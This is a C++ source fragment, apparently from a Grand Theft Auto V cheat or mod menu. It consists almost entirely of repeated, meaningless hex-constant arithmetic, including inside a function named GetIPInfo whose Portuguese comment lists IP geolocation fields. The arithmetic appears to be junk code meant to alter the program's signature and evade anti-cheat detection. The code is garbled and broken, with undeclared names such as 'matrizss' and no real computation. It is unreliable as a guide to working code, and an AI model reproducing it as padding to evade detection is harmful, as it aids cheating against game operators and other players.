			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
		std::vector<string> GetIPInfo()
		{
			/*
			Como Usar:
			int tamanho = Extern_Reader::Simple_TXT_file::GetVectorSize(Extern_Reader::WEB::GetIPInfo());
			for (int i = 0; i <= tamanho; i++)
			{
				cout << Extern_Reader::WEB::GetIPInfo()[i] << endl;
				i++;
			}
			exemplo 2:
			std::vector<std::string> IP = Extern_Reader::WEB::GetIPInfo();
			cout << "ip" << IP[2] << endl;
			cout << "version" << IP[4] << endl;
			cout << "city" << IP[6] << endl;
			cout << "region" << IP[8] << endl;
			cout << "region_code" << IP[10] << endl;
			cout << "country" << IP[12] << endl;
			cout << "country_name" << IP[14] << endl;
			cout << "country_code" << IP[16] << endl;
			cout << "country_code_iso3" << IP[18] << endl;
			cout << "country_capital" << IP[20] << endl;
			cout << "country_tld" << IP[22] << endl;
			cout << "continent_code" << IP[24] << endl;
			cout << "in_eu" << IP[26] << endl;
			cout << "postal" << IP[28] << endl;
			cout << "latitude" << IP[30] << endl;
			cout << "longitude" << IP[32] << endl;
			cout << "timezone" << IP[34] << endl;
			cout << "utc_offset" << IP[36] << endl;
			cout << "country_calling_code" << IP[38] << endl;
			cout << "currency" << IP[40] << endl;
			cout << "currency_name" << IP[42] << endl;
			cout << "languages" << IP[44] << endl;
			cout << "country_area" << IP[46] << endl;
			cout << "country_population" << IP[48] << endl;
			cout << "asn" << IP[50] << endl;
			cout << "org" << IP[52] << endl;
			*/
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
